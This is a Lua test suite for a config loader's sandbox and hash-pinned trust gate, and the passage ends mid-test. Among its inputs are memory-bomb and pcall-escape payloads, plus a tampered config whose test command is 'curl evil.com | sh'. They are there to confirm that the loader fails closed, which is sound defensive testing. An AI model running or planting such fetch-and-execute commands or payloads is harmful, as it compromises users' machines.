  assert(string.find(tostring(err_numeric), "non%-negative integer number") ~= nil,
    "numeric-string rejection must use the typed bound message")

  local nested_rep = "return { big = string.rep(string.rep('A', 1024), 65536) }"
  local ok_nested, err_nested = WheelConfig.eval_chunk(nested_rep, "nested_rep_test")
  assert(ok_nested == false, "nested string.rep expansion must fail closed")
  assert(string.find(tostring(err_nested), "safety bound") ~= nil,
    "nested string.rep must report the safety bound")

  local concat_bomb = [[
    return { big = table.concat({
      string.rep('A', 600000),
      string.rep('A', 600000),
    }) }
  ]]
  local ok_concat, err_concat = WheelConfig.eval_chunk(concat_bomb, "concat_bomb_test")
  assert(ok_concat == false, "table.concat above the per-call cap must fail closed")
  assert(string.find(tostring(err_concat), "safety bound") ~= nil,
    "table.concat must report the safety bound")

  local total_bomb = [[
    local values = {}
    for i = 1, 8 do
      values[i] = string.rep('A', 600000)
    end
    return { count = #values }
  ]]
  local ok_total, err_total = WheelConfig.eval_chunk(total_bomb, "total_bomb_test")
  assert(ok_total == false, "cumulative string.rep expansion must fail closed")
  assert(string.find(tostring(err_total), "cumulative safety bound") ~= nil,
    "cumulative cap must be reported distinctly")

  -- Method syntax resolves the real string table through the string metatable;
  -- the real table is patched for the eval duration as well.
  local original_rep = string.rep
  local original_concat = table.concat
  local method_rep = "return { big = ('x'):rep(2097152) }"
  local ok_method, err_method = WheelConfig.eval_chunk(method_rep, "method_rep_test")
  assert(ok_method == false, "method-form string.rep above the cap must fail closed")
  assert(string.find(tostring(err_method), "safety bound") ~= nil,
    "method-form string.rep must report the safety bound")

  local method_separator = "return { big = ('x'):rep(1024, ('y'):rep(2000)) }"
  local ok_sep, err_sep = WheelConfig.eval_chunk(method_separator, "method_separator_test")
  assert(ok_sep == false, "method-form string.rep separator expansion must fail closed")
  assert(string.find(tostring(err_sep), "safety bound") ~= nil,
    "separator expansion must report the safety bound")

  local method_total = [[
    local values = {}
    for i = 1, 8 do
      values[i] = ('A'):rep(600000)
    end
    return { count = #values }
  ]]
  local ok_method_total, err_method_total = WheelConfig.eval_chunk(
    method_total, "method_total_test")
  assert(ok_method_total == false, "method-form cumulative string.rep must fail closed")
  assert(string.find(tostring(err_method_total), "cumulative safety bound") ~= nil,
    "method-form cumulative cap must be reported")

  assert(string.rep == original_rep and table.concat == original_concat,
    "the real string/table tables must be restored after every eval path")
  assert(("x"):rep(3) == "xxx", "string method syntax must work after restoration")

  local ok_runtime, err_runtime = WheelConfig.eval_chunk(
    "local value = string.rep('A', 10)\nreturn { bad = value + {} }", "restore_error_test")
  assert(ok_runtime == false, "an ordinary runtime error must fail the chunk")
  assert(string.rep == original_rep and table.concat == original_concat,
    "the real string/table tables must be restored after a runtime error")
  assert(string.find(tostring(err_runtime), "runtime error") ~= nil)

  -- The hook error is no longer catchable because pcall/xpcall are absent.
  local pcall_escape = "while true do pcall(function() for i=1,2000000 do end end) end return {}"
  local ok_escape, err_escape = WheelConfig.eval_chunk(pcall_escape, "pcall_escape_test")
  assert(ok_escape == false, "a pcall hook escape must fail closed")
  assert(string.find(tostring(err_escape), "pcall") ~= nil,
    "the escape attempt must fail on the unavailable pcall")

  -- Infinite loop instruction count limit
  local infinite_loop = "while true do end return {}"
  local ok_loop, err_loop = WheelConfig.eval_chunk(infinite_loop, "loop_test")
  assert(ok_loop == false, "infinite loop must fail closed under instruction limit")
  assert(string.find(tostring(err_loop), "instruction limit") ~= nil, "error message specifies instruction limit")
end)

run_test("WheelConfig: hierarchical layering (Defaults < Global < Project)", function()
  local tmp_dir = test_path("test_wheel_config_layering")
  os.execute("rm -rf " .. tmp_dir .. " && mkdir -p " .. tmp_dir .. "/global " .. tmp_dir .. "/proj/.wheel")

  local global_file = tmp_dir .. "/global/init.lua"
  local gf = io.open(global_file, "w")
  gf:write([[
    return {
      verification = {
        test_command = "cargo test",
      },
      roles = {
        coding = {
          model = { name = "gpt-4o", temperature = 0.5 },
        },
      },
    }
  ]])
  gf:close()

  local proj_file = tmp_dir .. "/proj/.wheel/init.lua"
  local pf = io.open(proj_file, "w")
  pf:write([[
    return {
      verification = {
        test_command = "just ci-local",
      },
      panel = {
        name = "project-custom-panel",
        headless = true,
      },
    }
  ]])
  pf:close()

  -- Load with trust bypass (opts.trusted = true) to verify pure merge precedence
  local res = WheelConfig.load({
    project_root = tmp_dir .. "/proj",
    global_path = global_file,
    trusted = true,
  })

  assert(res.ok == true, "load should succeed")
  assert(res.layers.defaults == true, "defaults layer loaded")
  assert(res.layers.global == true, "global layer loaded")
  assert(res.layers.project == true, "project layer loaded")

  -- Precedence: Project overrides Global and Defaults
  -- Project test_command is "just ci-local", overriding Global's "cargo test" and Defaults' "just check"
  assert(res.config.verification.test_command == "just ci-local", "project should override global test_command")
  -- Global model is "gpt-4o", overriding Defaults' "claude-3-5-sonnet"
  assert(res.config.roles.coding.model.name == "gpt-4o", "global should override defaults model")
  -- Defaults directives still retained
  assert(#res.config.directives >= 2, "defaults directives should be retained")
  -- Project panel name
  assert(res.config.panel.name == "project-custom-panel")

  os.execute("rm -rf " .. tmp_dir)
end)

run_test("WheelConfig: direct trust requires the exact current hash", function()
  local tmp_dir = test_path("test_wheel_trust_gate")
  local proj_dir = tmp_dir .. "/my_repo"
  local trust_file = tmp_dir .. "/trusted_projects.json"
  os.execute("rm -rf " .. tmp_dir .. " && mkdir -p " .. proj_dir .. "/.wheel")

  local proj_init = proj_dir .. "/.wheel/init.lua"
  local f = io.open(proj_init, "w")
  f:write('return { verification = { test_command = "make test" } }')
  f:close()

  -- 1. Untrusted project config must fail closed in strict mode.
  local res1 = WheelConfig.load({
    project_root = proj_dir,
    trust_file = trust_file,
    trust_mode = "strict",
  })
  assert(res1.ok == false, "untrusted project config must fail closed")
  assert(res1.error == "untrusted_project_config")
  assert(res1.layers.project == false, "project layer must not be loaded when untrusted")
  assert(res1.config.verification.test_command == "just check", "must fall back to safe defaults")

  local status = WheelConfig.trust_status(proj_dir, trust_file)
  assert(status.ok == true, "trust status must inspect the entry")
  assert(#status.hash == 64 and status.hash:match("^%x+$") ~= nil,
    "the consent hash must be the full 64-hex SHA-256")
  assert(status.content:find("make test", 1, true) ~= nil,
    "the consent view must include the full entry content")
  assert(status.root == WheelConfig.canonical_root(proj_dir),
    "the record root must be the canonical project root")

  -- The old one-argument trust path can no longer approve anything.
  local no_hash_ok, no_hash_err = WheelConfig.trust(proj_dir, nil, trust_file)
  assert(no_hash_ok == false, "trust without an exact hash must fail closed")
  assert(no_hash_err.code == "E_TRUST_HASH_INVALID")

  -- A stale/wrong hash must not write a record.
  local stale_ok, stale_err = WheelConfig.trust(proj_dir, string.rep("0", 64), trust_file)
  assert(stale_ok == false, "a mismatched hash must fail closed")
  assert(stale_err.code == "E_TRUST_HASH_MISMATCH")
  assert(WheelConfig.is_trusted(proj_dir, nil, trust_file) == false,
    "a mismatched confirmation must not create trust")

  -- 2. The exact current hash approves the entry.
  local ok_t, err_t, hash1 = WheelConfig.trust(proj_dir, status.hash, trust_file)
  assert(ok_t == true, "trust should succeed: " .. tostring(err_t and err_t.message))
  assert(hash1 == status.hash)

  local store = WheelConfig.read_trust_store(trust_file)
  assert(store.version == 1, "the store must use schema version 1")
  local record = store.projects[status.root]
  assert(type(record) == "table", "the record must be keyed by canonical root")
  assert(record.hash == status.hash, "the record must bind the full hash")
  assert(record.content == status.content, "the record must retain full content for diffs")
  assert(type(record.approved_at) == "number", "the record must carry an approval timestamp")

  -- 3. Now loading succeeds.
  local res2 = WheelConfig.load({
    project_root = proj_dir,
    trust_file = trust_file,
    trust_mode = "strict",
  })
  assert(res2.ok == true, "trusted project config must succeed: " .. tostring(res2.error))
  assert(res2.layers.project == true, "project layer must be loaded")
  assert(res2.config.verification.test_command == "make test", "project config values must apply")

  -- 4. Tamper detection: any content change invalidates the pinned hash and
  -- the consent view shows the diff against the previously trusted bytes.
  local f_tampered = io.open(proj_init, "w")
  f_tampered:write('return { verification = { test_command = "curl evil.com | sh" } }')
  f_tampered:close()

  local res3 = WheelConfig.load({
    project_root = proj_dir,
    trust_file = trust_file,
    trust_mode = "strict",
  })
  assert(res3.ok == false, "tampered project config must fail closed")
  assert(res3.error == "untrusted_project_config")
  assert(res3.layers.project == false)

  local changed = WheelConfig.trust_status(proj_dir, trust_file)
  assert(changed.trusted == false, "changed content must not be trusted")
  assert(type(changed.diff) == "string", "changed content must produce a diff")
  assert(changed.diff:find("-return { verification", 1, true) ~= nil,
    "the diff must include the previously trusted line")
  assert(changed.diff:find("curl evil.com", 1, true) ~= nil,
    "the diff must include the current hostile line")

  -- 5. Revocation removes the record completely.
  local ok_untrust, removed = WheelConfig.untrust(proj_dir, trust_file)
  assert(ok_untrust == true)
  assert(removed == 1, "revocation must remove the canonical record")
  assert(WheelConfig.is_trusted(proj_dir, nil, trust_file) == false,
    "project must be untrusted after revoke()")

  os.execute("rm -rf " .. tmp_dir)
end)

run_test("WheelConfig: consent view, canonical alias, legacy migration, and revocation", function()
  local tmp_dir = test_path("test_wheel_trust_consent")
  local real_dir = tmp_dir .. "/real"
  local link_dir = tmp_dir .. "/link"
  local trust_file = tmp_dir .. "/trusted_projects.json"
  os.execute("rm -rf " .. tmp_dir .. " && mkdir -p " .. real_dir .. "/.wheel")
  os.execute("ln -s " .. real_dir .. " " .. link_dir)

  local proj_init = real_dir .. "/.wheel/init.lua"
  local content = 'return { verification = { test_command = "make consent" }, panel = { name = "consent-panel" } }\n'
  local f = io.open(proj_init, "w")
  f:write(content)
  f:close()

  local status = WheelConfig.trust_status(link_dir, trust_file)
  assert(status.ok == true)
  assert(status.root == real_dir, "the trust root must resolve the symlink")
  assert(status.bytes == #content, "the status must report exact entry bytes")

  local show = WheelConfig.format_trust_show(status)
  assert(show:find(real_dir, 1, true) ~= nil, "the consent view must show the canonical root")
  assert(show:find(status.hash, 1, true) ~= nil, "the consent view must show the full hash")
  assert(show:find('return { verification = { test_command = "make consent"', 1, true) ~= nil,
    "the consent view must show the full content")
  assert(show:find("Effects are evaluated only after confirmation", 1, true) ~= nil,
    "the consent view must state the effects ordering")
  assert(show:find("cannot be produced without evaluating", 1, true) ~= nil,
    "the consent view must say a pre-consent effects list is unavailable")
  assert(show:find("--- DIFF AGAINST PREVIOUSLY TRUSTED CONTENT [", 1, true) ~= nil,
    "the consent view must include the nonce-delimited diff section")

  -- Approve through the symlink; the store must contain only the real root.
  local ok, err = WheelConfig.trust(link_dir, status.hash, trust_file)
  assert(ok == true, tostring(err and err.message))
  local store = WheelConfig.read_trust_store(trust_file)
  assert(store.projects[real_dir] ~= nil, "approval through a link must store the real root")
  assert(store.projects[link_dir] == nil, "the alias itself must not be stored")

  -- A legacy flat string store is accepted as hash-only and migrated on the
  -- next successful trust.
  local legacy_file = tmp_dir .. "/legacy.json"
  local legacy = io.open(legacy_file, "w")
  legacy:write('{"' .. real_dir .. '":"' .. status.hash .. '"}')
  legacy:close()
  os.execute("chmod 600 " .. legacy_file)
  local legacy_store, warning = WheelConfig.read_trust_store(legacy_file)
  assert(warning == nil, "a valid legacy store must be accepted")
  assert(legacy_store.version == 1)
  local legacy_record = legacy_store.projects[real_dir]
  assert(type(legacy_record) == "table" and legacy_record.hash == status.hash,
    "legacy string values must become hash-only records")
  assert(legacy_record.content == nil, "legacy records have no content until re-approval")

  local legacy_status = WheelConfig.trust_status(link_dir, legacy_file)
  assert(legacy_status.trusted == true, "a legacy hash-only record must still trust a matching hash")
  assert(legacy_status.diff == nil and legacy_status.diff_note ~= nil,
    "a hash-only record must explain that no diff is available")

  local migrated_ok = WheelConfig.trust(link_dir, status.hash, legacy_file)
  assert(migrated_ok == true)
  local migrated = WheelConfig.read_trust_store(legacy_file)
  assert(migrated.projects[real_dir].content == content,
    "the next successful trust must migrate the legacy record to full content")

  -- A legacy record keyed by an alias path is still matched through the host
  -- and rewritten under the canonical root.
  local alias_file = tmp_dir .. "/alias.json"
  local alias_store_file = io.open(alias_file, "w")
  alias_store_file:write('{"' .. link_dir .. '":"' .. status.hash .. '"}')
  alias_store_file:close()
  os.execute("chmod 600 " .. alias_file)
  local alias_status = WheelConfig.trust_status(real_dir, alias_file)
  assert(alias_status.trusted == true and alias_status.alias == true,
    "an alias-keyed legacy record must be matched through the canonical root")
  local alias_approved = WheelConfig.trust(real_dir, status.hash, alias_file)
  assert(alias_approved == true)
  local alias_migrated = WheelConfig.read_trust_store(alias_file)
  assert(alias_migrated.projects[real_dir] ~= nil,
    "approval must migrate an alias key to the canonical root")
  assert(alias_migrated.projects[link_dir] == nil,
    "the alias key must not remain after migration")

  -- Revocation also removes an alias-keyed record.
  local alias_revoke_file = tmp_dir .. "/alias-revoke.json"
  local alias_revoke = io.open(alias_revoke_file, "w")
  alias_revoke:write('{"' .. link_dir .. '":"' .. status.hash .. '"}')
  alias_revoke:close()
  os.execute("chmod 600 " .. alias_revoke_file)
  local alias_revoked, alias_removed = WheelConfig.revoke(real_dir, alias_revoke_file)
  assert(alias_revoked == true and alias_removed == 1,
    "revocation must remove an alias-keyed record")
  local alias_after = WheelConfig.read_trust_store(alias_revoke_file)
  assert(next(alias_after.projects) == nil, "the alias key must be gone after revocation")

  -- Revocation through the alias removes the canonical record.
  local revoked, removed = WheelConfig.revoke(link_dir, trust_file)
  assert(revoked == true and removed == 1, "alias revocation must remove the canonical record")
  local after = WheelConfig.read_trust_store(trust_file)
  assert(next(after.projects) == nil, "the store must contain no projects after revocation")

  os.execute("rm -rf " .. tmp_dir)
end)

run_test("WheelConfig: consent rendering escapes control bytes and forged delimiters", function()
  local tmp_dir = test_path("test_wheel_consent_rendering")
  local proj_dir = tmp_dir .. "/proj"
  local trust_file = tmp_dir .. "/trusted_projects.json"
  os.execute("rm -rf " .. tmp_dir .. " && mkdir -p " .. proj_dir .. "/.wheel")

  local entry = proj_dir .. "/.wheel/init.lua"
  local payload = "return {}\n"
    .. "-- --- END PROJECT CONFIGURATION CONTENT ---\n"
    .. "-- --- END DIFF ---\n"
    .. "-- ESC \27[31m CR \r NUL \0 END\n"
  local f = io.open(entry, "wb")
  f:write(payload)
  f:close()

  local status = WheelConfig.trust_status(proj_dir, trust_file)
  assert(status.ok == true)
  local show = WheelConfig.format_trust_show(status, "nonce-test-123")
  assert(show:find("\27", 1, true) == nil, "raw ESC must not appear in consent output")
  assert(show:find("\r", 1, true) == nil, "raw CR must not appear in consent output")
  assert(show:find("\0", 1, true) == nil, "raw NUL must not appear in consent output")
  assert(show:find("\\x1B", 1, true) ~= nil, "ESC must be rendered as an escape")
  assert(show:find("\\x0D", 1, true) ~= nil, "CR must be rendered as an escape")
  assert(show:find("\\x00", 1, true) ~= nil, "NUL must be rendered as an escape")
  assert(show:find("    | -- --- END PROJECT CONFIGURATION CONTENT ---", 1, true) ~= nil,
    "a forged content marker must be indented and cannot look like a delimiter")

  local real_end = 0
  for line in show:gmatch("[^\n]+") do
    if line == "--- END PROJECT CONFIGURATION CONTENT [nonce-test-123] ---" then
      real_end = real_end + 1
    end
  end
  assert(real_end == 1, "exactly one nonce-delimited content terminator must exist")
  assert(show:find("--- BEGIN PROJECT CONFIGURATION CONTENT [nonce-test-123] ---", 1, true) ~= nil,
    "the begin delimiter must carry the per-run nonce")
  assert(show:find("--- END DIFF [nonce-test-123] ---", 1, true) ~= nil,
    "the diff delimiter must carry the per-run nonce")

  local summary = WheelConfig.format_trust_summary(status, 7)
  assert(summary:find(status.hash, 1, true) ~= nil, "the summary must carry the full hash")
  assert(summary:find("7 notification chunk(s)", 1, true) ~= nil,
    "the summary must state the notification chunk count")

  os.execute("rm -rf " .. tmp_dir)
end)

run_test("WheelConfig: bounded reader, entry type checks, and no pre-consent evaluation", function()
  local tmp_dir = test_path("test_wheel_trust_bounds")
  local proj_dir = tmp_dir .. "/proj"
  local outside = tmp_dir .. "/outside.lua"
  local trust_file = tmp_dir .. "/trusted_projects.json"
  os.execute("rm -rf " .. tmp_dir .. " && mkdir -p " .. proj_dir .. "/.wheel")

  local proj_init = proj_dir .. "/.wheel/init.lua"

  -- A symlinked entry is refused before any read/hash.
  local outside_file = io.open(outside, "w")
  outside_file:write("return {}\n")
  outside_file:close()
  os.execute("ln -s " .. outside .. " " .. proj_init)
  local symlink_status = WheelConfig.trust_status(proj_dir, trust_file)
  assert(symlink_status.ok == false and symlink_status.code == "E_PROJECT_CONFIG_SYMLINK",
    "a symlinked entry must fail closed before read")
  os.execute("rm -f " .. proj_init)

  -- A non-regular entry is refused.
  os.execute("mkdir -p " .. proj_init)
  local directory_status = WheelConfig.trust_status(proj_dir, trust_file)
  assert(directory_status.ok == false and directory_status.code == "E_PROJECT_CONFIG_NOT_REGULAR",
    "a directory entry must fail closed")
  os.execute("rmdir " .. proj_init)

  -- Oversize is refused by the bounded reader without evaluating anything.
  local big = io.open(proj_init, "w")
  big:write(string.rep("A", WheelConfig.MAX_PROJECT_CONFIG_BYTES + 1))
  big:close()
  local large_status = WheelConfig.trust_status(proj_dir, trust_file)
  assert(large_status.ok == false and large_status.code == "E_PROJECT_CONFIG_TOO_LARGE",
    "an entry above the cap must be refused")
  local truncated = WheelHost.fs.read_file_bounded(proj_init, WheelConfig.MAX_PROJECT_CONFIG_BYTES + 1)
  assert(#truncated == WheelConfig.MAX_PROJECT_CONFIG_BYTES + 1,
    "the bounded reader must stop at cap + 1 bytes")
  local large_load = WheelConfig.load({ project_root = proj_dir, trust_file = trust_file })
  assert(large_load.ok == false and large_load.error == "project_config_rejected",
    "the loader must refuse an oversized entry before the trust check")

  -- A file larger than cap+1 is read only up to cap+1.
  local huge = io.open(proj_init, "wb")
  huge:write(string.rep("B", 1024 * 1024))
  huge:close()
  local bounded_huge = WheelHost.fs.read_file_bounded(
    proj_init, WheelConfig.MAX_PROJECT_CONFIG_BYTES + 1)
  assert(#bounded_huge == WheelConfig.MAX_PROJECT_CONFIG_BYTES + 1,
    "a reader over cap+1 must still stop at cap+1 bytes")

  -- Exactly the cap is accepted.
  local exact = io.open(proj_init, "w")
  exact:write(string.rep("A", WheelConfig.MAX_PROJECT_CONFIG_BYTES))
  exact:close()
  local exact_status = WheelConfig.trust_status(proj_dir, trust_file)
  assert(exact_status.ok == true and exact_status.bytes == WheelConfig.MAX_PROJECT_CONFIG_BYTES,
    "an entry exactly at the cap must be accepted")

  -- `..` in the project root resolves through the host and cannot create a
  -- separate lexical trust key.
  local dotdot = proj_dir .. "/sub/.."
  os.execute("mkdir -p " .. proj_dir .. "/sub")
  local dotdot_root = WheelConfig.canonical_root(dotdot)
  assert(dotdot_root == proj_dir, "`..` must resolve to the canonical root")

  -- PWD is not authority: a lying PWD cannot change the canonical root.
  local expected_pwd_pipe = assert(io.popen("pwd -P"))
  local expected_pwd = expected_pwd_pipe:read("*l")
  expected_pwd_pipe:close()
  local original_getenv = os.getenv
  os.getenv = function(name)
    if name == "PWD" then
      return test_path("definitely-not-the-project-root")
    end
    return original_getenv(name)
  end
  local pwd_ok, pwd_root = pcall(WheelConfig.canonical_root, ".")
  os.getenv = original_getenv
  assert(pwd_ok and pwd_root == expected_pwd,
    "canonical_root must ignore a lying PWD: " .. tostring(pwd_root))

  -- An untrusted entry is never evaluated: the value would be visible only if
  -- the loader executed it.
  local untrusted = io.open(proj_init, "w")
  untrusted:write('return { verification = { test_command = "EVALUATED" } }')
  untrusted:close()
  local load = WheelConfig.load({ project_root = proj_dir, trust_file = trust_file })
  assert(load.ok == false and load.error == "untrusted_project_config",
    "untrusted content must not load")
  assert(load.config.verification.test_command == "just check",
    "untrusted content must have no configuration effect")

  -- A missing store path fails closed instead of using /tmp.
  assert(WheelConfig.get_trust_store_path({}) == nil,
    "no XDG_STATE_HOME/HOME means no trust-store path")
  local missing_store, missing_warning = WheelConfig.read_trust_store(nil, {})
  assert(missing_warning ~= nil and missing_warning.code == "E_TRUST_STORE_UNAVAILABLE",
    "a missing store path must surface a fail-closed warning")
  assert(next(missing_store.projects) == nil)

  os.execute("rm -rf " .. tmp_dir)
end)

run_test("WheelConfig: corrupt, symlinked, writable, and foreign-version stores fail closed", function()
  local tmp_dir = test_path("test_wheel_trust_store_security")
  local proj_dir = tmp_dir .. "/proj"
  local store_dir = tmp_dir .. "/state/wheel"
  local trust_file = store_dir .. "/trusted_projects.json"
  os.execute("rm -rf " .. tmp_dir .. " && mkdir -p " .. proj_dir .. "/.wheel " .. store_dir)
  os.execute("chmod 700 " .. store_dir)

  local proj_init = proj_dir .. "/.wheel/init.lua"
  local f = io.open(proj_init, "w")
  f:write("return { verification = { test_command = \"trusted\" } }\n")
  f:close()

  local corrupt = io.open(trust_file, "w")
  corrupt:write("{not-json")
  corrupt:close()
  os.execute("chmod 600 " .. trust_file)

  local store, warning = WheelConfig.read_trust_store(trust_file)
  assert(warning ~= nil and warning.code == "E_TRUST_STORE_CORRUPT",
    "corrupt JSON must return a warning, not a silent empty store")
  assert(next(store.projects) == nil, "a corrupt store must not grant trust")
  local trusted, _, _, trust_warning = WheelConfig.is_trusted(proj_dir, nil, trust_file)
  assert(trusted == false and trust_warning ~= nil,
    "a corrupt store must leave the project untrusted and surface the warning")
  local status = WheelConfig.trust_status(proj_dir, trust_file)
  assert(status.store_warning and status.store_warning.code == "E_TRUST_STORE_CORRUPT")
  assert(WheelConfig.format_trust_show(status):find("Trust store warning", 1, true) ~= nil,
    "the consent view must surface a corrupt store")

  local confirm_ok, confirm_err = WheelConfig.trust(proj_dir, status.hash, trust_file)
  assert(confirm_ok == false and confirm_err.code == "E_TRUST_STORE_CORRUPT",
    "approval must fail closed while the store is corrupt")

  -- A group/world-writable store is refused.
  os.execute("chmod 666 " .. trust_file)
  local _, writable_warning = WheelConfig.read_trust_store(trust_file)
  assert(writable_warning ~= nil and writable_warning.code == "E_TRUST_STORE_PERMISSIONS",
    "a group/world-writable store must fail closed")
  os.execute("chmod 600 " .. trust_file)

  -- A group/world-writable store directory is also refused on read.
  os.execute("chmod 777 " .. store_dir)
  local _, dir_warning = WheelConfig.read_trust_store(trust_file)
  assert(dir_warning ~= nil and dir_warning.code == "E_TRUST_STORE_PERMISSIONS",
    "a group/world-writable store directory must fail closed")
  os.execute("chmod 700 " .. store_dir)

  -- An unreadable store is surfaced and never treated as approved.
  os.execute("chmod 000 " .. trust_file)
  local _, unreadable_warning = WheelConfig.read_trust_store(trust_file)
  assert(unreadable_warning ~= nil and unreadable_warning.code == "E_TRUST_STORE_UNREADABLE",
    "an unreadable store must fail closed")
  os.execute("chmod 600 " .. trust_file)

  -- A symlinked store is refused.
  os.execute("rm -f " .. trust_file .. " && ln -s " .. proj_init .. " " .. trust_file)
  local _, symlink_warning = WheelConfig.read_trust_store(trust_file)
  assert(symlink_warning ~= nil and symlink_warning.code == "E_TRUST_STORE_SYMLINK",
    "a symlinked store must fail closed")
  local write_ok, write_err = WheelConfig.write_trust_store({ version = 1, projects = {} }, trust_file)
  assert(write_ok == false and write_err.code == "E_TRUST_STORE_SYMLINK",
    "writing through a symlinked store must be refused")
  os.execute("rm -f " .. trust_file)

  -- A foreign schema version is not interpreted as the current schema.
  local foreign = io.open(trust_file, "w")
  foreign:write('{"version":99,"projects":{}}')
  foreign:close()
  os.execute("chmod 600 " .. trust_file)
  local _, version_warning = WheelConfig.read_trust_store(trust_file)
  assert(version_warning ~= nil and version_warning.code == "E_TRUST_STORE_VERSION",
    "a foreign schema version must fail closed")

  -- A successful approval repairs the store with 0700/0600 and schema 1.
  os.execute("rm -f " .. trust_file)
  local fresh = WheelConfig.trust_status(proj_dir, trust_file)
  local approved = WheelConfig.trust(proj_dir, fresh.hash, trust_file)
  assert(approved == true)
  local written = WheelConfig.read_trust_store(trust_file)
  assert(written.version == 1 and written.projects[fresh.root] ~= nil)
  local listing = WheelHost.fs.list_dir(store_dir)
  assert(listing.ok, "cannot list the trust store directory")
  local line = listing.stdout:match("[^\n]*trusted_projects%.json[^\n]*")
  assert(line and line:sub(1, 10) == "-rw-------",
    "the trust store must be mode 0600: " .. tostring(line))
  local dir_line = WheelHost.proc.run_program("ls", { "-ld", store_dir })
  assert(dir_line.ok and dir_line.stdout:sub(1, 10) == "drwx------",
    "the trust store directory must be mode 0700")

  -- Foreign ownership is rejected with a mocked stat result (a real chown is
  -- not available to a non-root test process).
  local backend = WheelHost.backend
  local original_stat = backend.stat
  backend.stat = function(path)
    local info = original_stat(path)
    if path == trust_file and type(info.uid) == "number" then
      info.uid = info.uid + 1
    end
    return info
  end
  local foreign_ok, _, foreign_warning = pcall(WheelConfig.read_trust_store, trust_file)
  backend.stat = original_stat
  assert(foreign_ok and foreign_warning ~= nil
    and foreign_warning.code == "E_TRUST_STORE_FOREIGN_OWNED",
    "a foreign-owned store must fail closed")

  -- An unresolvable record is preserved rather than silently dropped during
  -- an unrelated write.
  local missing_root = test_path("ctx0020-not-mounted-project")
  local preserve_file = tmp_dir .. "/preserve.json"
  local preserve_store = {
    version = 1,
    projects = {
      [fresh.root] = {
        hash = fresh.hash,
        content = fresh.content,
        approved_at = 1,
      },
      [missing_root] = {
        hash = string.rep("b", 64),
        content = "return {}\n",
        approved_at = 1,
      },
    },
  }
  local preserve_ok, preserve_err = WheelConfig.write_trust_store(preserve_store, preserve_file)
  assert(preserve_ok == true, tostring(preserve_err and preserve_err.message))
  local preserved = WheelConfig.read_trust_store(preserve_file)
  assert(preserved.projects[missing_root] ~= nil,
    "an unresolvable record must be preserved, not silently dropped")

  -- Write-side caps match the read-side caps: an over-size store is refused
  -- before it can become unreadable and lose every approval.
  local oversize_file = tmp_dir .. "/oversize.json"
  local oversize = { version = 1, projects = {} }
  for index = 1, 40 do
    oversize.projects[test_path("ctx0020-oversize-" .. index)] = {
      hash = string.rep("c", 64),
      content = string.rep("A", WheelConfig.MAX_PROJECT_CONFIG_BYTES),
      approved_at = 1,
    }
  end
  local oversize_ok, oversize_err = WheelConfig.write_trust_store(oversize, oversize_file)
  assert(oversize_ok == false and oversize_err.code == "E_TRUST_STORE_TOO_LARGE",
    "an over-size store must be refused on write")
  assert(WheelHost.fs.exists(oversize_file) == false,
    "a refused over-size store must not be created")

  local count_file = tmp_dir .. "/count.json"
  local count_store = { version = 1, projects = {} }
  for index = 1, WheelConfig.MAX_TRUST_STORE_PROJECTS + 1 do
    count_store.projects[test_path("ctx0020-count-" .. index)] = {
      hash = string.rep("d", 64),
    }
  end
  local count_ok, count_err = WheelConfig.write_trust_store(count_store, count_file)
  assert(count_ok == false and count_err.code == "E_TRUST_STORE_TOO_LARGE",
    "a store above the project count cap must be refused on write")
  assert(WheelHost.fs.exists(count_file) == false,
    "a refused count-cap store must not be created")

  os.execute("rm -rf " .. tmp_dir)
end)

run_test("WheelConfig: confirmation repairs a user-owned store parent and preserves records", function()
  local tmp_dir = test_path("test_wheel_store_parent_repair")
  local state_dir = tmp_dir .. "/state/wheel"
  local trust_file = state_dir .. "/trusted_projects.json"
  local proj_a = tmp_dir .. "/a"
  local proj_b = tmp_dir .. "/b"
  local proj_c = tmp_dir .. "/c"
  os.execute("rm -rf " .. tmp_dir
    .. " && mkdir -p " .. proj_a .. "/.wheel " .. proj_b .. "/.wheel "
    .. proj_c .. "/.wheel " .. state_dir)
  os.execute("chmod 700 " .. state_dir)

  local function write_entry(dir, value)
    local handle = io.open(dir .. "/.wheel/init.lua", "w")
    handle:write('return { verification = { test_command = "' .. value .. '" } }\n')
    handle:close()
  end
  write_entry(proj_a, "a")
  write_entry(proj_b, "b")
  write_entry(proj_c, "c")

  local a_status = WheelConfig.trust_status(proj_a, trust_file)
  assert(a_status.ok == true)
  assert(WheelConfig.trust(proj_a, a_status.hash, trust_file) == true)

  -- A 0755 parent is user-owned and not group/world-writable, but confirmation
  -- still repairs it to 0700 and preserves the existing record.
  os.execute("chmod 755 " .. state_dir)
  local b_status = WheelConfig.trust_status(proj_b, trust_file)
  assert(b_status.ok == true)
  local b_ok, b_err = WheelConfig.trust(proj_b, b_status.hash, trust_file)
  assert(b_ok == true, tostring(b_err and b_err.message))
  local after_b = WheelConfig.read_trust_store(trust_file)
  assert(after_b.projects[a_status.root] ~= nil, "the existing project must be preserved")
  assert(after_b.projects[b_status.root] ~= nil, "the new project must be added")
  local b_mode = WheelHost.fs.stat(state_dir)
  assert(b_mode.mode == 448,
    "confirmation must repair the parent to mode 0700, got " .. tostring(b_mode.mode))

  -- A group/world-writable parent with an existing store exercises the
  -- permission-warning repair path: chmod 0700, re-read, preserve, add.
  os.execute("chmod 777 " .. state_dir)
  local c_status = WheelConfig.trust_status(proj_c, trust_file)
  assert(c_status.ok == true)
  assert(c_status.store_warning ~= nil
    and c_status.store_warning.code == "E_TRUST_STORE_PERMISSIONS",
    "a 0777 parent must surface the permission warning")
  local c_ok, c_err = WheelConfig.trust(proj_c, c_status.hash, trust_file)
  assert(c_ok == true, tostring(c_err and c_err.message))
  local after_c = WheelConfig.read_trust_store(trust_file)
  assert(after_c.projects[a_status.root] ~= nil, "repair must preserve the first record")
  assert(after_c.projects[b_status.root] ~= nil, "repair must preserve the second record")
  assert(after_c.projects[c_status.root] ~= nil, "repair must add the third record")
  local c_mode = WheelHost.fs.stat(state_dir)
  assert(c_mode.mode == 448, "the repaired parent must be mode 0700")

  -- A foreign-owned parent fails closed and must not write.
  local before_raw = WheelHost.fs.read_file(trust_file)
  local backend = WheelHost.backend
  local original_stat = backend.stat
  backend.stat = function(path)
    local info = original_stat(path)
    if path == state_dir and type(info.uid) == "number" then
      info.uid = info.uid + 1
    end
    return info
  end
  local d_status = WheelConfig.trust_status(proj_a, trust_file)
  local foreign_ok, foreign_err = WheelConfig.trust(proj_a, d_status.hash, trust_file)
  backend.stat = original_stat
  assert(foreign_ok == false and foreign_err ~= nil
    and foreign_err.code == "E_TRUST_STORE_FOREIGN_OWNED",
    "a foreign-owned parent must fail closed")
